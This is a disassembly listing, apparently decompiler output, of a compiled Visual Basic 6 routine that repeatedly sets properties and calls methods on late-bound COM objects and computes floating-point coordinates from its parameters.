00882FEB: mov var_04, 0000001Eh
00882FF2: lea eax, var_30
00882FF5: mov var_58, eax
00882FF8: mov var_60, 00004008h
00882FFF: mov eax, [ebp+08h]
00883002: mov eax, [eax]
00883004: push [ebp+08h]
00883007: call [eax+00000308h]
0088300D: push eax
0088300E: lea eax, var_34
00883011: push eax
00883012: call 00410A84h ; Set (object)
00883017: mov var_000000DC, eax
0088301D: lea eax, var_38
00883020: push eax
00883021: mov eax, [ebp+20h]
00883024: mov ecx, [eax]
00883026: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088302B: push eax
0088302C: mov eax, var_000000DC
00883032: mov eax, [eax]
00883034: push var_000000DC
0088303A: call [eax+40h]
0088303D: fclex 
0088303F: mov var_000000E0, eax
00883045: cmp var_000000E0, 00000000h
0088304C: jnl 88306Eh
0088304E: push 00000040h
00883050: push 00440DE8h
00883055: push var_000000DC
0088305B: push var_000000E0
00883061: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883066: mov var_000001D8, eax
0088306C: jmp 883075h
0088306E: and var_000001D8, 00000000h
00883075: push 00000010h
00883077: pop eax
00883078: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088307D: lea esi, var_60
00883080: mov edi, esp
00883082: movsd 
00883083: movsd 
00883084: movsd 
00883085: movsd 
00883086: push 68030002h
0088308B: push var_38
0088308E: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883093: lea eax, var_38
00883096: push eax
00883097: lea eax, var_34
0088309A: push eax
0088309B: push 00000002h
0088309D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008830A2: add esp, 0000000Ch
008830A5: mov var_04, 0000001Fh
008830AC: mov eax, [ebp+18h]
008830AF: mov var_58, eax
008830B2: mov var_60, 00004003h
008830B9: mov eax, [ebp+08h]
008830BC: mov eax, [eax]
008830BE: push [ebp+08h]
008830C1: call [eax+00000308h]
008830C7: push eax
008830C8: lea eax, var_34
008830CB: push eax
008830CC: call 00410A84h ; Set (object)
008830D1: mov var_000000DC, eax
008830D7: lea eax, var_38
008830DA: push eax
008830DB: mov eax, [ebp+20h]
008830DE: mov ecx, [eax]
008830E0: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008830E5: push eax
008830E6: mov eax, var_000000DC
008830EC: mov eax, [eax]
008830EE: push var_000000DC
008830F4: call [eax+40h]
008830F7: fclex 
008830F9: mov var_000000E0, eax
008830FF: cmp var_000000E0, 00000000h
00883106: jnl 883128h
00883108: push 00000040h
0088310A: push 00440DE8h
0088310F: push var_000000DC
00883115: push var_000000E0
0088311B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883120: mov var_000001DC, eax
00883126: jmp 88312Fh
00883128: and var_000001DC, 00000000h
0088312F: push 00000010h
00883131: pop eax
00883132: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883137: lea esi, var_60
0088313A: mov edi, esp
0088313C: movsd 
0088313D: movsd 
0088313E: movsd 
0088313F: movsd 
00883140: push 68030003h
00883145: push var_38
00883148: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
0088314D: lea eax, var_38
00883150: push eax
00883151: lea eax, var_34
00883154: push eax
00883155: push 00000002h
00883157: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088315C: add esp, 0000000Ch
0088315F: mov var_04, 00000020h
00883166: lea eax, [ebp+14h]
00883169: mov var_58, eax
0088316C: mov var_60, 00004003h
00883173: mov eax, [ebp+08h]
00883176: mov eax, [eax]
00883178: push [ebp+08h]
0088317B: call [eax+00000308h]
00883181: push eax
00883182: lea eax, var_34
00883185: push eax
00883186: call 00410A84h ; Set (object)
0088318B: mov var_000000DC, eax
00883191: lea eax, var_38
00883194: push eax
00883195: mov eax, [ebp+20h]
00883198: mov ecx, [eax]
0088319A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088319F: push eax
008831A0: mov eax, var_000000DC
008831A6: mov eax, [eax]
008831A8: push var_000000DC
008831AE: call [eax+40h]
008831B1: fclex 
008831B3: mov var_000000E0, eax
008831B9: cmp var_000000E0, 00000000h
008831C0: jnl 8831E2h
008831C2: push 00000040h
008831C4: push 00440DE8h
008831C9: push var_000000DC
008831CF: push var_000000E0
008831D5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008831DA: mov var_000001E0, eax
008831E0: jmp 8831E9h
008831E2: and var_000001E0, 00000000h
008831E9: push 00000010h
008831EB: pop eax
008831EC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008831F1: lea esi, var_60
008831F4: mov edi, esp
008831F6: movsd 
008831F7: movsd 
008831F8: movsd 
008831F9: movsd 
008831FA: push 68030004h
008831FF: push var_38
00883202: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883207: lea eax, var_38
0088320A: push eax
0088320B: lea eax, var_34
0088320E: push eax
0088320F: push 00000002h
00883211: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883216: add esp, 0000000Ch
00883219: mov var_04, 00000021h
00883220: or var_58, FFFFFFFFh
00883224: mov var_60, 0000000Bh
0088322B: mov eax, [ebp+08h]
0088322E: mov eax, [eax]
00883230: push [ebp+08h]
00883233: call [eax+00000308h]
00883239: push eax
0088323A: lea eax, var_34
0088323D: push eax
0088323E: call 00410A84h ; Set (object)
00883243: mov var_000000DC, eax
00883249: lea eax, var_38
0088324C: push eax
0088324D: mov eax, [ebp+20h]
00883250: mov ecx, [eax]
00883252: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883257: push eax
00883258: mov eax, var_000000DC
0088325E: mov eax, [eax]
00883260: push var_000000DC
00883266: call [eax+40h]
00883269: fclex 
0088326B: mov var_000000E0, eax
00883271: cmp var_000000E0, 00000000h
00883278: jnl 88329Ah
0088327A: push 00000040h
0088327C: push 00440DE8h
00883281: push var_000000DC
00883287: push var_000000E0
0088328D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883292: mov var_000001E4, eax
00883298: jmp 8832A1h
0088329A: and var_000001E4, 00000000h
008832A1: push 00000010h
008832A3: pop eax
008832A4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008832A9: lea esi, var_60
008832AC: mov edi, esp
008832AE: movsd 
008832AF: movsd 
008832B0: movsd 
008832B1: movsd 
008832B2: push 80010007h
008832B7: push var_38
008832BA: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
008832BF: lea eax, var_38
008832C2: push eax
008832C3: lea eax, var_34
008832C6: push eax
008832C7: push 00000002h
008832C9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008832CE: add esp, 0000000Ch
008832D1: mov var_04, 00000022h
008832D8: and var_58, 00000000h
008832DC: mov var_60, 00000002h
008832E3: mov eax, [ebp+08h]
008832E6: mov eax, [eax]
008832E8: push [ebp+08h]
008832EB: call [eax+00000308h]
008832F1: push eax
008832F2: lea eax, var_34
008832F5: push eax
008832F6: call 00410A84h ; Set (object)
008832FB: mov var_000000DC, eax
00883301: lea eax, var_38
00883304: push eax
00883305: mov eax, [ebp+20h]
00883308: mov ecx, [eax]
0088330A: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0088330F: push eax
00883310: mov eax, var_000000DC
00883316: mov eax, [eax]
00883318: push var_000000DC
0088331E: call [eax+40h]
00883321: fclex 
00883323: mov var_000000E0, eax
00883329: cmp var_000000E0, 00000000h
00883330: jnl 883352h
00883332: push 00000040h
00883334: push 00440DE8h
00883339: push var_000000DC
0088333F: push var_000000E0
00883345: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088334A: mov var_000001E8, eax
00883350: jmp 883359h
00883352: and var_000001E8, 00000000h
00883359: push 00000010h
0088335B: pop eax
0088335C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883361: lea esi, var_60
00883364: mov edi, esp
00883366: movsd 
00883367: movsd 
00883368: movsd 
00883369: movsd 
0088336A: push 00000001h
0088336C: push 80011000h
00883371: push var_38
00883374: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00883379: add esp, 0000001Ch
0088337C: lea eax, var_38
0088337F: push eax
00883380: lea eax, var_34
00883383: push eax
00883384: push 00000002h
00883386: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0088338B: add esp, 0000000Ch
0088338E: jmp 00883D52h
00883393: mov var_04, 00000024h
0088339A: mov eax, [ebp+08h]
0088339D: mov eax, [eax]
0088339F: push [ebp+08h]
008833A2: call [eax+0000030Ch]
008833A8: push eax
008833A9: lea eax, var_34
008833AC: push eax
008833AD: call 00410A84h ; Set (object)
008833B2: mov var_000000DC, eax
008833B8: lea eax, var_000000D4
008833BE: push eax
008833BF: mov eax, var_000000DC
008833C5: mov eax, [eax]
008833C7: push var_000000DC
008833CD: call [eax+48h]
008833D0: fclex 
008833D2: mov var_000000E0, eax
008833D8: cmp var_000000E0, 00000000h
008833DF: jnl 883401h
008833E1: push 00000048h
008833E3: push 00440DE8h
008833E8: push var_000000DC
008833EE: push var_000000E0
008833F4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008833F9: mov var_000001EC, eax
008833FF: jmp 883408h
00883401: and var_000001EC, 00000000h
00883408: mov ax, var_000000D4
0088340F: add ax, 0001h
00883413: jo 00883DB2h
00883419: movsx eax, ax
0088341C: mov ecx, [ebp+20h]
0088341F: mov [ecx], eax
00883421: lea ecx, var_34
00883424: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00883429: mov var_04, 00000025h
00883430: cmp [008F529Ch], 00000000h
00883437: jnz 883454h
00883439: push 008F529Ch
0088343E: push 00440F2Ch
00883443: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00883448: mov var_000001F0, 008F529Ch
00883452: jmp 88345Eh
00883454: mov var_000001F0, 008F529Ch
0088345E: mov eax, var_000001F0
00883464: mov eax, [eax]
00883466: mov var_000000E4, eax
0088346C: mov eax, [ebp+08h]
0088346F: mov eax, [eax]
00883471: push [ebp+08h]
00883474: call [eax+0000030Ch]
0088347A: push eax
0088347B: lea eax, var_34
0088347E: push eax
0088347F: call 00410A84h ; Set (object)
00883484: mov var_000000DC, eax
0088348A: lea eax, var_38
0088348D: push eax
0088348E: mov eax, [ebp+20h]
00883491: mov ecx, [eax]
00883493: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883498: push eax
00883499: mov eax, var_000000DC
0088349F: mov eax, [eax]
008834A1: push var_000000DC
008834A7: call [eax+40h]
008834AA: fclex 
008834AC: mov var_000000E0, eax
008834B2: cmp var_000000E0, 00000000h
008834B9: jnl 8834DBh
008834BB: push 00000040h
008834BD: push 00440DE8h
008834C2: push var_000000DC
008834C8: push var_000000E0
008834CE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008834D3: mov var_000001F4, eax
008834D9: jmp 8834E2h
008834DB: and var_000001F4, 00000000h
008834E2: mov eax, var_38
008834E5: mov var_00000114, eax
008834EB: and var_38, 00000000h
008834EF: push var_00000114
008834F5: lea eax, var_3C
008834F8: push eax
008834F9: call 00410A84h ; Set (object)
008834FE: push eax
008834FF: mov eax, var_000000E4
00883505: mov eax, [eax]
00883507: push var_000000E4
0088350D: call [eax+0Ch]
00883510: fclex 
00883512: mov var_000000E8, eax
00883518: cmp var_000000E8, 00000000h
0088351F: jnl 883541h
00883521: push 0000000Ch
00883523: push 00440F1Ch
00883528: push var_000000E4
0088352E: push var_000000E8
00883534: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883539: mov var_000001F8, eax
0088353F: jmp 883548h
00883541: and var_000001F8, 00000000h
00883548: lea eax, var_3C
0088354B: push eax
0088354C: lea eax, var_34
0088354F: push eax
00883550: push 00000002h
00883552: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883557: add esp, 0000000Ch
0088355A: mov var_04, 00000026h
00883561: mov eax, [ebp+20h]
00883564: mov eax, [eax]
00883566: mov var_2C, eax
00883569: mov var_04, 00000027h
00883570: mov eax, [ebp+18h]
00883573: xor ecx, ecx
00883575: cmp [eax], FFFFFFD8h
00883578: setle cl
0088357B: mov eax, [ebp+18h]
0088357E: xor edx, edx
00883580: cmp [eax], 00000028h
00883583: setnl dl
00883586: or ecx, edx
00883588: test ecx, ecx
0088358A: jnz 8835B9h
0088358C: mov var_04, 00000028h
00883593: cmp [ebp+14h], FFFFFFECh
00883597: jle 8835B9h
00883599: cmp [ebp+14h], 00000014h
0088359D: jnl 8835B9h
0088359F: mov var_04, 00000029h
008835A6: mov eax, [ebp+18h]
008835A9: mov eax, [eax]
008835AB: add eax, 00000007h
008835AE: jo 00883DB2h
008835B4: mov ecx, [ebp+18h]
008835B7: mov [ecx], eax
008835B9: mov var_04, 0000002Ch
008835C0: mov eax, [ebp+18h]
008835C3: cmp [eax], 00000000h
008835C6: jl 008837C0h
008835CC: mov var_04, 0000002Dh
008835D3: fild dword ptr var_28
008835D6: fstp real8 ptr var_00000200
008835DC: mov eax, var_28
008835DF: imul eax, [ebp+14h]
008835E3: jo 00883DB2h
008835E9: mov var_00000204, eax
008835EF: fild dword ptr var_00000204
008835F5: fstp real8 ptr var_0000020C
008835FB: fld real8 ptr var_0000020C
00883601: cmp [008F2000h], 00000000h
00883608: jnz 883612h
0088360A: fdiv real8 ptr [0040B998h]
00883610: jmp 883623h
00883612: push [0040B99Ch]
00883618: push [0040B998h]
0088361E: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00883623: fadd real8 ptr var_00000200
00883629: fstp real4 ptr var_58
0088362C: fstsw ax
0088362E: test al, 0Dh
00883630: jnz 00883DADh
00883636: mov var_60, 00000004h
0088363D: fild dword ptr var_24
00883640: fstp real8 ptr var_00000214
00883646: mov eax, [ebp+18h]
00883649: mov ecx, var_24
0088364C: imul ecx, [eax]
0088364F: jo 00883DB2h
00883655: mov var_00000218, ecx
0088365B: fild dword ptr var_00000218
00883661: fstp real8 ptr var_00000220
00883667: fld real8 ptr var_00000220
0088366D: cmp [008F2000h], 00000000h
00883674: jnz 88367Eh
00883676: fdiv real8 ptr [0040DBD0h]
0088367C: jmp 88368Fh
0088367E: push [0040DBD4h]
00883684: push [0040DBD0h]
0088368A: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0088368F: fsubr real8 ptr var_00000214
00883695: fadd real8 ptr [0040C1F8h]
0088369B: fstp real8 ptr var_78
0088369E: fstsw ax
008836A0: test al, 0Dh
008836A2: jnz 00883DADh
008836A8: mov var_80, 00000005h
008836AF: mov var_00000098, 00000004h
008836B9: mov var_000000A0, 00000002h
008836C3: mov var_000000B8, 00000004h
008836CD: mov var_000000C0, 00000002h
008836D7: mov eax, [ebp+08h]
008836DA: mov eax, [eax]
008836DC: push [ebp+08h]
008836DF: call [eax+0000030Ch]
008836E5: push eax
008836E6: lea eax, var_34
008836E9: push eax
008836EA: call 00410A84h ; Set (object)
008836EF: mov var_000000DC, eax
008836F5: lea eax, var_38
008836F8: push eax
008836F9: mov eax, [ebp+20h]
008836FC: mov ecx, [eax]
008836FE: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883703: push eax
00883704: mov eax, var_000000DC
0088370A: mov eax, [eax]
0088370C: push var_000000DC
00883712: call [eax+40h]
00883715: fclex 
00883717: mov var_000000E0, eax
0088371D: cmp var_000000E0, 00000000h
00883724: jnl 883746h
00883726: push 00000040h
00883728: push 00440DE8h
0088372D: push var_000000DC
00883733: push var_000000E0
00883739: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0088373E: mov var_00000224, eax
00883744: jmp 88374Dh
00883746: and var_00000224, 00000000h
0088374D: push 00000010h
0088374F: pop eax
00883750: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883755: lea esi, var_60
00883758: mov edi, esp
0088375A: movsd 
0088375B: movsd 
0088375C: movsd 
0088375D: movsd 
0088375E: push 00000010h
00883760: pop eax
00883761: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883766: lea esi, var_80
00883769: mov edi, esp
0088376B: movsd 
0088376C: movsd 
0088376D: movsd 
0088376E: movsd 
0088376F: push 00000010h
00883771: pop eax
00883772: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883777: lea esi, var_000000A0
0088377D: mov edi, esp
0088377F: movsd 
00883780: movsd 
00883781: movsd 
00883782: movsd 
00883783: push 00000010h
00883785: pop eax
00883786: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088378B: lea esi, var_000000C0
00883791: mov edi, esp
00883793: movsd 
00883794: movsd 
00883795: movsd 
00883796: movsd 
00883797: push 00000004h
00883799: push 80011001h
0088379E: push var_38
008837A1: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008837A6: add esp, 0000004Ch
008837A9: lea eax, var_38
008837AC: push eax
008837AD: lea eax, var_34
008837B0: push eax
008837B1: push 00000002h
008837B3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008837B8: add esp, 0000000Ch
008837BB: jmp 008839AFh
008837C0: mov var_04, 0000002Fh
008837C7: fild dword ptr var_28
008837CA: fstp real8 ptr var_0000022C
008837D0: mov eax, var_28
008837D3: imul eax, [ebp+14h]
008837D7: jo 00883DB2h
008837DD: mov var_00000230, eax
008837E3: fild dword ptr var_00000230
008837E9: fstp real8 ptr var_00000238
008837EF: fld real8 ptr var_00000238
008837F5: cmp [008F2000h], 00000000h
008837FC: jnz 883806h
008837FE: fdiv real8 ptr [0040B998h]
00883804: jmp 883817h
00883806: push [0040B99Ch]
0088380C: push [0040B998h]
00883812: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00883817: fadd real8 ptr var_0000022C
0088381D: fstp real4 ptr var_58
00883820: fstsw ax
00883822: test al, 0Dh
00883824: jnz 00883DADh
0088382A: mov var_60, 00000004h
00883831: fild dword ptr var_24
00883834: fstp real8 ptr var_00000240
0088383A: mov eax, [ebp+18h]
0088383D: mov ecx, var_24
00883840: imul ecx, [eax]
00883843: jo 00883DB2h
00883849: mov var_00000244, ecx
0088384F: fild dword ptr var_00000244
00883855: fstp real8 ptr var_0000024C
0088385B: fld real8 ptr var_0000024C
00883861: cmp [008F2000h], 00000000h
00883868: jnz 883872h
0088386A: fdiv real8 ptr [0040DBD0h]
00883870: jmp 883883h
00883872: push [0040DBD4h]
00883878: push [0040DBD0h]
0088387E: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00883883: fsubr real8 ptr var_00000240
00883889: fsub real8 ptr [0040DBC8h]
0088388F: fstp real8 ptr var_78
00883892: fstsw ax
00883894: test al, 0Dh
00883896: jnz 00883DADh
0088389C: mov var_80, 00000005h
008838A3: mov var_00000098, 00000004h
008838AD: mov var_000000A0, 00000002h
008838B7: mov var_000000B8, 00000004h
008838C1: mov var_000000C0, 00000002h
008838CB: mov eax, [ebp+08h]
008838CE: mov eax, [eax]
008838D0: push [ebp+08h]
008838D3: call [eax+0000030Ch]
008838D9: push eax
008838DA: lea eax, var_34
008838DD: push eax
008838DE: call 00410A84h ; Set (object)
008838E3: mov var_000000DC, eax
008838E9: lea eax, var_38
008838EC: push eax
008838ED: mov eax, [ebp+20h]
008838F0: mov ecx, [eax]
008838F2: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008838F7: push eax
008838F8: mov eax, var_000000DC
008838FE: mov eax, [eax]
00883900: push var_000000DC
00883906: call [eax+40h]
00883909: fclex 
0088390B: mov var_000000E0, eax
00883911: cmp var_000000E0, 00000000h
00883918: jnl 88393Ah
0088391A: push 00000040h
0088391C: push 00440DE8h
00883921: push var_000000DC
00883927: push var_000000E0
0088392D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883932: mov var_00000250, eax
00883938: jmp 883941h
0088393A: and var_00000250, 00000000h
00883941: push 00000010h
00883943: pop eax
00883944: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883949: lea esi, var_60
0088394C: mov edi, esp
0088394E: movsd 
0088394F: movsd 
00883950: movsd 
00883951: movsd 
00883952: push 00000010h
00883954: pop eax
00883955: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088395A: lea esi, var_80
0088395D: mov edi, esp
0088395F: movsd 
00883960: movsd 
00883961: movsd 
00883962: movsd 
00883963: push 00000010h
00883965: pop eax
00883966: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088396B: lea esi, var_000000A0
00883971: mov edi, esp
00883973: movsd 
00883974: movsd 
00883975: movsd 
00883976: movsd 
00883977: push 00000010h
00883979: pop eax
0088397A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0088397F: lea esi, var_000000C0
00883985: mov edi, esp
00883987: movsd 
00883988: movsd 
00883989: movsd 
0088398A: movsd 
0088398B: push 00000004h
0088398D: push 80011001h
00883992: push var_38
00883995: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0088399A: add esp, 0000004Ch
0088399D: lea eax, var_38
008839A0: push eax
008839A1: lea eax, var_34
008839A4: push eax
008839A5: push 00000002h
008839A7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008839AC: add esp, 0000000Ch
008839AF: mov var_04, 00000031h
008839B6: lea eax, var_30
008839B9: mov var_58, eax
008839BC: mov var_60, 00004008h
008839C3: mov eax, [ebp+08h]
008839C6: mov eax, [eax]
008839C8: push [ebp+08h]
008839CB: call [eax+0000030Ch]
008839D1: push eax
008839D2: lea eax, var_34
008839D5: push eax
008839D6: call 00410A84h ; Set (object)
008839DB: mov var_000000DC, eax
008839E1: lea eax, var_38
008839E4: push eax
008839E5: mov eax, [ebp+20h]
008839E8: mov ecx, [eax]
008839EA: call 004108B0h ; msvbvm60.dll.__vbaI2I4
008839EF: push eax
008839F0: mov eax, var_000000DC
008839F6: mov eax, [eax]
008839F8: push var_000000DC
008839FE: call [eax+40h]
00883A01: fclex 
00883A03: mov var_000000E0, eax
00883A09: cmp var_000000E0, 00000000h
00883A10: jnl 883A32h
00883A12: push 00000040h
00883A14: push 00440DE8h
00883A19: push var_000000DC
00883A1F: push var_000000E0
00883A25: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883A2A: mov var_00000254, eax
00883A30: jmp 883A39h
00883A32: and var_00000254, 00000000h
00883A39: push 00000010h
00883A3B: pop eax
00883A3C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883A41: lea esi, var_60
00883A44: mov edi, esp
00883A46: movsd 
00883A47: movsd 
00883A48: movsd 
00883A49: movsd 
00883A4A: push 68030001h
00883A4F: push var_38
00883A52: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883A57: lea eax, var_38
00883A5A: push eax
00883A5B: lea eax, var_34
00883A5E: push eax
00883A5F: push 00000002h
00883A61: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883A66: add esp, 0000000Ch
00883A69: mov var_04, 00000032h
00883A70: mov eax, [ebp+18h]
00883A73: mov var_58, eax
00883A76: mov var_60, 00004003h
00883A7D: mov eax, [ebp+08h]
00883A80: mov eax, [eax]
00883A82: push [ebp+08h]
00883A85: call [eax+0000030Ch]
00883A8B: push eax
00883A8C: lea eax, var_34
00883A8F: push eax
00883A90: call 00410A84h ; Set (object)
00883A95: mov var_000000DC, eax
00883A9B: lea eax, var_38
00883A9E: push eax
00883A9F: mov eax, [ebp+20h]
00883AA2: mov ecx, [eax]
00883AA4: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883AA9: push eax
00883AAA: mov eax, var_000000DC
00883AB0: mov eax, [eax]
00883AB2: push var_000000DC
00883AB8: call [eax+40h]
00883ABB: fclex 
00883ABD: mov var_000000E0, eax
00883AC3: cmp var_000000E0, 00000000h
00883ACA: jnl 883AECh
00883ACC: push 00000040h
00883ACE: push 00440DE8h
00883AD3: push var_000000DC
00883AD9: push var_000000E0
00883ADF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883AE4: mov var_00000258, eax
00883AEA: jmp 883AF3h
00883AEC: and var_00000258, 00000000h
00883AF3: push 00000010h
00883AF5: pop eax
00883AF6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883AFB: lea esi, var_60
00883AFE: mov edi, esp
00883B00: movsd 
00883B01: movsd 
00883B02: movsd 
00883B03: movsd 
00883B04: push 68030002h
00883B09: push var_38
00883B0C: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883B11: lea eax, var_38
00883B14: push eax
00883B15: lea eax, var_34
00883B18: push eax
00883B19: push 00000002h
00883B1B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883B20: add esp, 0000000Ch
00883B23: mov var_04, 00000033h
00883B2A: lea eax, [ebp+14h]
00883B2D: mov var_58, eax
00883B30: mov var_60, 00004003h
00883B37: mov eax, [ebp+08h]
00883B3A: mov eax, [eax]
00883B3C: push [ebp+08h]
00883B3F: call [eax+0000030Ch]
00883B45: push eax
00883B46: lea eax, var_34
00883B49: push eax
00883B4A: call 00410A84h ; Set (object)
00883B4F: mov var_000000DC, eax
00883B55: lea eax, var_38
00883B58: push eax
00883B59: mov eax, [ebp+20h]
00883B5C: mov ecx, [eax]
00883B5E: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883B63: push eax
00883B64: mov eax, var_000000DC
00883B6A: mov eax, [eax]
00883B6C: push var_000000DC
00883B72: call [eax+40h]
00883B75: fclex 
00883B77: mov var_000000E0, eax
00883B7D: cmp var_000000E0, 00000000h
00883B84: jnl 883BA6h
00883B86: push 00000040h
00883B88: push 00440DE8h
00883B8D: push var_000000DC
00883B93: push var_000000E0
00883B99: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883B9E: mov var_0000025C, eax
00883BA4: jmp 883BADh
00883BA6: and var_0000025C, 00000000h
00883BAD: push 00000010h
00883BAF: pop eax
00883BB0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883BB5: lea esi, var_60
00883BB8: mov edi, esp
00883BBA: movsd 
00883BBB: movsd 
00883BBC: movsd 
00883BBD: movsd 
00883BBE: push 68030003h
00883BC3: push var_38
00883BC6: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883BCB: lea eax, var_38
00883BCE: push eax
00883BCF: lea eax, var_34
00883BD2: push eax
00883BD3: push 00000002h
00883BD5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883BDA: add esp, 0000000Ch
00883BDD: mov var_04, 00000034h
00883BE4: or var_58, FFFFFFFFh
00883BE8: mov var_60, 0000000Bh
00883BEF: mov eax, [ebp+08h]
00883BF2: mov eax, [eax]
00883BF4: push [ebp+08h]
00883BF7: call [eax+0000030Ch]
00883BFD: push eax
00883BFE: lea eax, var_34
00883C01: push eax
00883C02: call 00410A84h ; Set (object)
00883C07: mov var_000000DC, eax
00883C0D: lea eax, var_38
00883C10: push eax
00883C11: mov eax, [ebp+20h]
00883C14: mov ecx, [eax]
00883C16: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883C1B: push eax
00883C1C: mov eax, var_000000DC
00883C22: mov eax, [eax]
00883C24: push var_000000DC
00883C2A: call [eax+40h]
00883C2D: fclex 
00883C2F: mov var_000000E0, eax
00883C35: cmp var_000000E0, 00000000h
00883C3C: jnl 883C5Eh
00883C3E: push 00000040h
00883C40: push 00440DE8h
00883C45: push var_000000DC
00883C4B: push var_000000E0
00883C51: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883C56: mov var_00000260, eax
00883C5C: jmp 883C65h
00883C5E: and var_00000260, 00000000h
00883C65: push 00000010h
00883C67: pop eax
00883C68: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883C6D: lea esi, var_60
00883C70: mov edi, esp
00883C72: movsd 
00883C73: movsd 
00883C74: movsd 
00883C75: movsd 
00883C76: push 80010007h
00883C7B: push var_38
00883C7E: call 00410A72h ; msvbvm60.dll.__vbaLateIdSt
00883C83: lea eax, var_38
00883C86: push eax
00883C87: lea eax, var_34
00883C8A: push eax
00883C8B: push 00000002h
00883C8D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883C92: add esp, 0000000Ch
00883C95: mov var_04, 00000035h
00883C9C: and var_58, 00000000h
00883CA0: mov var_60, 00000002h
00883CA7: mov eax, [ebp+08h]
00883CAA: mov eax, [eax]
00883CAC: push [ebp+08h]
00883CAF: call [eax+0000030Ch]
00883CB5: push eax
00883CB6: lea eax, var_34
00883CB9: push eax
00883CBA: call 00410A84h ; Set (object)
00883CBF: mov var_000000DC, eax
00883CC5: lea eax, var_38
00883CC8: push eax
00883CC9: mov eax, [ebp+20h]
00883CCC: mov ecx, [eax]
00883CCE: call 004108B0h ; msvbvm60.dll.__vbaI2I4
00883CD3: push eax
00883CD4: mov eax, var_000000DC
00883CDA: mov eax, [eax]
00883CDC: push var_000000DC
00883CE2: call [eax+40h]
00883CE5: fclex 
00883CE7: mov var_000000E0, eax
00883CED: cmp var_000000E0, 00000000h
00883CF4: jnl 883D16h
00883CF6: push 00000040h
00883CF8: push 00440DE8h
00883CFD: push var_000000DC
00883D03: push var_000000E0
00883D09: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00883D0E: mov var_00000264, eax
00883D14: jmp 883D1Dh
00883D16: and var_00000264, 00000000h
00883D1D: push 00000010h
00883D1F: pop eax
00883D20: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00883D25: lea esi, var_60
00883D28: mov edi, esp
00883D2A: movsd 
00883D2B: movsd 
00883D2C: movsd 
00883D2D: movsd 
00883D2E: push 00000001h
00883D30: push 80011000h
00883D35: push var_38
00883D38: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
00883D3D: add esp, 0000001Ch
00883D40: lea eax, var_38
00883D43: push eax
00883D44: lea eax, var_34
00883D47: push eax
00883D48: push 00000002h
00883D4A: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00883D4F: add esp, 0000000Ch
00883D52: wait 
00883D53: push 00883D86h
